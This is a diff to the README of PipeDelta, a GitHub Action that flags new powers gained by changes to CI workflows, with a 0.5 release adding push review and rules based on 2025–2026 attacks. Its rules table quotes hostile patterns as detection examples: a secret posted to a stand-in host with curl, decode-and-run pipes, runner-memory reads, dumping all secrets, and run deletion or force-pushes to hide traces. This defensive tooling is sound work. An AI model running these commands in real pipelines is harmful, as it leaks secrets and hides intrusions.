@@ -1,9 +1,9 @@
 # PipeDelta
 
-**A pull request just changed your CI pipeline. What can that pipeline do now that it
-could not do before?**
+**Your CI pipeline just changed, by a pull request or by a direct push. What can it do
+now that it could not do before?**
 
-PipeDelta answers that question for GitHub Actions. It compares the workflow files
+PipeDelta is a **change reviewer for CI/CD**. It answers that question for GitHub Actions. It compares the workflow files
 (and the actions stored in the repository) before and after a change, and reports
 in plain sentences the **new powers** the pipeline gained: secrets it can now read,
 addresses it now contacts, permissions, triggers, outside code, hidden commands. Each
@@ -36,6 +36,31 @@ plausible change to a workflow file: a new step that reads a secret and posts it
 somewhere. A reviewer sees ten lines of YAML. PipeDelta turns those ten lines into
 sentences about what changed.
 
+The two largest campaigns of 2026 did not even open a pull request. GhostAction's
+return (Sep to Oct 2026, 30,000+ repositories) and wfx-loot (Nov 2026, about 8,000
+repositories) pushed malicious workflows **straight to the default branch** with
+stolen tokens, so pull-request checks never ran. Since 0.5, PipeDelta reviews pushes
+too.
+
+## New in 0.5
+
+- **Push review.** The same action runs on `push`: a workflow pushed straight to
+  `main` gets the same report and a failing check. If the commit before the push
+  cannot be read (for example after a force push), it fails closed.
+- **Rules from the 2025 and 2026 attacks:** reading the runner's memory
+  (tj-actions), a workflow that writes workflows or adds its own approval label
+  (prt-scan), deleting runs or force-pushing to hide traces (wfx-loot), a build
+  cache in a workflow outsiders can start (Ultralytics), OIDC identity explained
+  (Mini Shai-Hulud), and handing every secret to a step at once.
+- **Incident replay benchmark** (`docs/REPLAY.md`): nine real attacks from Dec 2024
+  to Nov 2026, each rebuilt from its public write-up. PipeDelta 0.5 blocks 9, version
+  0.4 blocked 6, and zizmor 1.32 raises a new high finding on 2. Caveats are in the
+  document; read them before quoting the numbers.
+- **SARIF output** (`--format sarif`, or the `sarif-file` input): findings appear in
+  GitHub's Security tab next to CodeQL and zizmor.
+- **Signed releases**: multi-arch images (amd64, arm64) on GHCR, signed with Sigstore,
+  with SLSA build provenance and an SPDX SBOM. See "Verify the image".
+
 ## How it differs from zizmor and poutine
 
 [zizmor](https://github.com/zizmorcore/zizmor) and
@@ -66,6 +91,9 @@ same plain language, and notes where both tools agree.
 on:
   pull_request:          # not pull_request_target: strangers get no secrets
     paths: [".github/**", ".pipedelta.yml", "**/action.yml", "**/action.yaml"]
+  push:                  # also review changes pushed straight to main
+    branches: [main]
+    paths: [".github/**", ".pipedelta.yml", "**/action.yml", "**/action.yaml"]
 permissions:
   contents: read
 jobs:
@@ -74,16 +102,37 @@ jobs:
     permissions:
       contents: read
       pull-requests: write
+      security-events: write # only if you upload SARIF
     steps:
       - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
         with:
-          fetch-depth: 0
+          fetch-depth: 0     # needed to read the commit before a push
           persist-credentials: false
-      - uses: Vachana7/pipedelta@<commit id of the release you use> # v0.4.0
+      - uses: Vachana7/pipedelta@<commit id of the release you use> # v0.5.0
         with:
           token: ${{ github.token }}
           fail-on: high          # low, medium, high or never (comment only)
           zizmor: "off"          # "on" adds zizmor's new findings
+          sarif-file: pipedelta.sarif   # optional
+      - uses: github/codeql-action/upload-sarif@33d7b85da1a04171e211befe2c739303b9a4c066 # v4.39.3
+        if: always() && hashFiles('pipedelta.sarif') != ''
+        with:
+          sarif_file: pipedelta.sarif
+          category: pipedelta
+```
+
+On a push there is no pull request to comment on: the report goes to the run's
+summary page and the check fails, which GitHub e-mails to the person who pushed.
+
+### Verify the image
+
+Release images are signed without a stored key (Sigstore) and carry SLSA provenance:
+
+```sh
+cosign verify ghcr.io/vachana7/pipedelta:0.5.0 \
+  --certificate-identity-regexp '^https://github.com/Vachana7/pipedelta/' \
+  --certificate-oidc-issuer https://token.actions.githubusercontent.com
+gh attestation verify oci://ghcr.io/vachana7/pipedelta:0.5.0 --repo Vachana7/pipedelta
 ```
 
 Lock PipeDelta itself to a commit, as above. PipeDelta flags unlocked actions as
@@ -134,6 +183,12 @@ and `docker compose up dashboard` for the results page at http://localhost:8080.
 | Hidden command | `base64 -d \| bash`, `xxd -r \| sh`, `exec(b64decode(...))` | high |
 | Secret plus a new address in one job | `curl -d "$TOKEN" evil.example` | high |
 | PipeDelta step removed | the check switches itself off | high |
+| Reads the runner's memory | `/proc/<pid>/maps`, `Runner.Worker` (tj-actions, 2025) | high |
+| Writes and pushes workflow files | `cp x.yml .github/workflows/ && git push` (prt-scan, 2026) | high |
+| Deletes runs or rewrites history | `gh run delete`, `git push --force` (wfx-loot, 2026) | high |
+| Every secret at once | `${{ toJSON(secrets) }}` | high |
+| OIDC identity tokens | `id-token: write` (Mini Shai-Hulud, 2026) | high |
+| Cache or labels in a workflow outsiders can start | `cache: pip` under `pull_request_target` (Ultralytics, 2024) | high |
 | New secret, new address, address only known at run time | `secrets.X`, `secrets['X']`, `curl "$URL"` | medium |
 | No token limit, self-hosted machine, outside container image | | medium |
 | Version bumps, renamed jobs, GitHub's own actions | | low |
@@ -156,6 +211,10 @@ page: `dashboard/index.html`.
 
 ## Known limits
 
+- Push review runs from the workflow file in the pushed commit. Someone who can push
+  could also weaken PipeDelta's own settings in the same push. Removing the step is
+  reported (high), and a required status check makes it harder, but the real fix is
+  to run outside the repository: that is the GitHub App on the roadmap.
 - It does not look inside **outside** actions or inside scripts a step runs
   (`run: ./build.sh`). A change to such a script is not a workflow change.
 - An address built from variables is reported as "only known at run time", not by
@@ -167,8 +226,28 @@ page: `dashboard/index.html`.
   on busy projects; teams that do not lock actions to commits may prefer
   `fail-on: never` (comment only) or a trust list.
 
+## Vision and roadmap
+
+PipeDelta aims to be the **change reviewer for CI/CD**: whenever a pipeline changes,
+by pull request, by direct push or by an upstream action moving, say in plain words
+what it can now do and block it if that is dangerous. It works alongside scanners
+such as zizmor (posture) rather than replacing them (changes).
+
+| Phase | What | Status |
+|---|---|---|
+| 1. Proof | 2026 attack rules, push review, incident replay benchmark, SARIF, signed multi-arch images | done in 0.5 |
+| 2. Upstream | Diff an action's own code when its pinned commit or `actions.lock` entry changes (the tj-actions pattern); hand-label the 155 blocked history commits and publish precision | next |
+| 3. Monitor | A GitHub App that reviews every push across an organisation from outside the repository, with Postgres, a Helm chart, Prometheus metrics and a Grafana board | planned |
+| 4. Reach | Scale run on 500+ public repositories, a write-up, read egress logs from GitHub's firewall or Harden-Runner, a GitLab adapter | later |
+
+Deliberately not planned: a runtime egress firewall (GitHub and StepSecurity ship
+one) or a hosted multi-tenant service. Details: `docs/ROADMAP.md`.
+
 ## Documents
 
+- `docs/PITCH.md`: one-page pitch
+- `docs/ROADMAP.md`: positioning, market and roadmap
+- `docs/REPLAY.md`: incident replay benchmark (generated)
 - `docs/DEMO.md`: expo demo script and likely examiner questions
 - `docs/EVALUATION.md`: what was measured and what was not
 - `docs/UX.md`: personas, user journey, wireframes
